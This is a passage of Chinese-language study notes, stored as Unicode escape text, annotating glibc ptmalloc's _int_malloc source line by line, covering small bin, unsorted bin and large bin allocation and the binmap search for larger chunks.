\u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } \u5c0f\u603b\u7ed3 \u00b6 malloc \u53c2\u6570\u662f\u65e0\u7b26\u53f7\u957f\u6574\u578b smallbin \u662f\u4ece\u6700\u540e\u7ed3\u70b9\uff08\u6700\u5148\u8fdb\u5165\uff09\u5f00\u59cb\u53d6 chunk \uff0c\u7b26\u5408\u201c\u5148\u8fdb\u5148\u51fa\u201d small bin malloc \u68c0\u67e5\u673a\u5236 \u00b6 \u6b65\u9aa4\u5982\u4e0b\uff1a bck = victim->bk; | (bck->fd != victim) \uff1a\u68c0\u67e5\u5373\u5c06\u5206\u914d\u7684\u7684 victim \u7684\u4e0a\u4e00\u4e2a chunk \u7684 fd \u6307\u9488\u662f\u5426\u6307\u5411 victim \u9632\u6b62\u4f2a\u9020 set_inuse_bit_at_offset(victim, nb); \uff1a\u4fee\u6539 victim \u7684 size inuse \u4f4d bin->bk = bck; | bck->fd = bin; \uff1a\u4fee\u6539\u94fe\u8868\u5c06 victime \u53d6\u51fa\u6765\uff08small bin \u6700\u540e\u4e00\u4e2a\uff09 large bin \u00b6 \u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684 chunk\uff0c\u800c\u662f**\u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1 malloc_state \u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684 chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d**\uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662f ptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002 /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { // \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002 idx = largebin_index ( nb ); // \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin if ( have_fastchunks ( av )) malloc_consolidate ( av ); } \u5927\u5faa\u73af - \u904d\u5386 unsorted bin \u00b6 2020.07.08 largebin \u5206\u914d\u673a\u5236\u4e0d\u592a\u660e\u767d \u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk \u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662f large chunk \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406 \u3002 \u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c \u6309\u7167 FIFO \u7684\u65b9\u5f0f\u9010\u4e2a\u5c06 unsorted bin \u4e2d\u7684 chunk \u53d6\u51fa\u6765 \u5982\u679c\u662f small request\uff0c\u5219\u8003\u8651\u662f\u4e0d\u662f\u6070\u597d\u6ee1\u8db3\uff0c\u662f\u7684\u8bdd\uff0c\u76f4\u63a5\u8fd4\u56de\u3002 \u5982\u679c\u4e0d\u662f\u7684\u8bdd\uff0c\u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002 \u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58 \u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9 fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914d small bin chunk\u3002 /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a \"small\" request. */ for (;;) { int iters = 0 ; unsorted bin \u904d\u5386 \u00b6 \u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8e small bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002 \u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002 // \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a // First In First Out while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { // victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk // bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk bck = victim -> bk ; // \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927 // \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); // \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002 size = chunksize ( victim ); SMALL REQUEST \u00b6 \u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk \uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u540e\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c \u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7 \uff1f /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ //\u662f\u5426\u662fsmallbin\u8303\u56f4\uff1bbck\u662f\u5426\u662f\u94fe\u9996\uff1bremainder\u662f\uff08\u5206\u914d\u5b8c\uff09\u5269\u4f59\u90e8\u5206 if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f remainder_size = size - nb ; // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e remainder = chunk_at_offset ( victim , nb ); // \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5 // av\u662f\u88ab\u53d6\u51fachunk\u7684\u4e0b\u4e00\u4e2achunk\uff08fd\uff09 unsorted_chunks ( av ) -> bk = unsorted_chunks ( av ) -> fd = remainder ; // \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder av -> last_remainder = remainder ; // \u66f4\u65b0last remainder\u7684\u6307\u9488 remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0cinuse set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6e remainder \u7684\u5934\u90e8 set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002 set_foot ( remainder , remainder_size ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } \u521d\u59cb\u53d6\u51fa \u00b6 /* remove from unsorted list */ //\u4fee\u6539 unsortedchunk \u94fe\u8868 unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av ); \u53d6\u51fa chunk \u5927\u5c0f\u521a\u597d\u5408\u9002 \uff08EXACT FIT\uff09 \u00b6 \u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002 /* Take now instead of binning if exact fit */ if ( size == nb ) { //\u5927\u5c0f\u6b63\u597d\u5408\u9002 set_inuse_bit_at_offset ( victim , size ); // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); //\u76f4\u63a5\u8fd4\u56de chunk \u6307\u9488 return p ; } \u5c06\u53d6\u51fa\u6765 chunk \u653e\u5165\u5230 smallbin \uff08PLACE CHUNK IN SMALL BIN\uff09 \u00b6 \u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002 /* place chunk in bin */ //\u5224\u65ad size \u662f\u5426\u5728smallbin if ( in_smallbin_range ( size )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 victim_index = smallbin_index ( size ); // \u8c03\u6574 small bin \u7684\u94fe\u8868 bck = bin_at ( av , victim_index ); fwd = bck -> fd ; PLACE CHUNK IN LARGE BIN \u00b6 \u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002 \u8fd9\u91cc\u5e94\u8be5\u662f\u83b7\u53d6\u6b63\u786e\u63d2\u5165\u4f4d\u7f6e\u7684\u6307\u9488 bck\u3001fwd\u3002\u6700\u540e\u63d2\u5165\u5f62\u5f0f\u4e3a\uff1abck\u2194victim\u2194fwd\u3002 \u94fe\u8868\u6784\u5efa\u5728\uff1a \u6700\u7ec8\u53d6\u51fa } else { // large bin \u8303\u56f4 victim_index = largebin_index ( size ); bck = bin_at ( av , victim_index ); // \u5f53\u524d large bin \u7684\u5934\u90e8 fwd = bck -> fd ; /* maintain large bins in sorted order */ /* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002 \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/ // \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a if ( fwd != bck ) { /* Or with inuse bit to speed comparisons */ // \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684 chunk \u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002 size |= PREV_INUSE ; /* if smaller than smallest, bypass loop below */ // bck->bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002 // \u5982\u679c\u904d\u5386\u7684 chunk \u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002 // \u5224\u65ad bck->bk \u662f\u4e0d\u662f\u5728 main arena\u3002 assert ( chunk_main_arena ( bck -> bk )); if (( unsigned long ) ( size ) < ( unsigned long ) chunksize_nomask ( bck -> bk )) { // \u4ee4 fwd \u6307\u5411 large bin \u5934 fwd = bck ; // \u4ee4 bck \u6307\u5411 largin bin \u5c3e\u90e8 chunk bck = bck -> bk ; // victim \u7684 fd_nextsize \u6307\u5411 largin bin \u7684\u7b2c\u4e00\u4e2a chunk victim -> fd_nextsize = fwd -> fd ; // victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u6307\u5411\u7684 bk_nextsize victim -> bk_nextsize = fwd -> fd -> bk_nextsize ; // \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim // \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim fwd -> fd -> bk_nextsize = victim -> bk_nextsize -> fd_nextsize = victim ; } else { // \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk // \u5224\u65ad fwd \u662f\u5426\u5728 main arena assert ( chunk_main_arena ( fwd )); // \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk while (( unsigned long ) size < chunksize_nomask ( fwd )) { fwd = fwd -> fd_nextsize ; assert ( chunk_main_arena ( fwd )); } // \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c // \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002 if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { // \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837 // \u90a3\u4e48\u5c31\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86 victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; } } else // \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002 victim -> fd_nextsize = victim -> bk_nextsize = victim ; } \u6700\u7ec8\u53d6\u51fa \u00b6 // \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bck<-->victim<-->fwd\u3002 mark_bin ( av , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ; WHILE \u8fed\u4ee3\u6b21\u6570 \u00b6 while \u6700\u591a\u8fed\u4ee3 10000 \u6b21\u540e\u9000\u51fa\u3002 // #define MAX_ITERS 10000 if ( ++ iters >= MAX_ITERS ) break ; } large chunk \u00b6 \u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a small bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0 chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684 chunk\u3002 \u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002 /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ //\u5224\u65ad\u662f\u5426smallbin if ( ! in_smallbin_range ( nb )) { bin = bin_at ( av , idx ); /* skip scan if empty or largest chunk is too small */ // \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7 // first(bin)=bin->fd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk if (( victim = first ( bin )) != bin && ( unsigned long ) chunksize_nomask ( victim ) >= ( unsigned long ) ( nb )) { // \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk victim = victim -> bk_nextsize ; while ((( unsigned long ) ( size = chunksize ( victim )) < ( unsigned long ) ( nb ))) victim = victim -> bk_nextsize ; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk // \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize // \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002 if ( victim != last ( bin ) && chunksize_nomask ( victim ) == chunksize_nomask ( victim -> fd )) victim = victim -> fd ; // \u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb ; // \u8fdb\u884cunlink\uff08\u5b8f\u64cd\u4f5c\uff09 unlink ( av , victim , bck , fwd ); /* Exhaust */ // \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757 // \u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002 else { // \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u63d2\u5165unsorted bin\u4e2d bck = unsorted_chunks ( av ); fwd = bck -> fd ; // \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002 if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; // \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5 if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001 // \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86 set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot ( remainder , remainder_size ); } // \u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u8f6c\u6362\u4e3amem\u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } \u5bfb\u627e\u8f83\u5927 chunk \u00b6 \u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684 chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684 bin \u4e2d\u83b7\u53d6 chunk 1 \uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002 /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++ idx ; // \u83b7\u53d6\u5bf9\u5e94\u7684bin bin = bin_at ( av , idx ); // \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15 // #define idx2block(i) ((i) >> BINMAPSHIFT) ,BINMAPSHIFT=5 // Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728 // \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5 block = idx2block ( idx ); // \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757 map = av -> binmap [ block ]; // #define idx2bit(i) ((1U << ((i) & ((1U << BINMAPSHIFT) - 1)))) // \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0 bit = idx2bit ( idx ); for 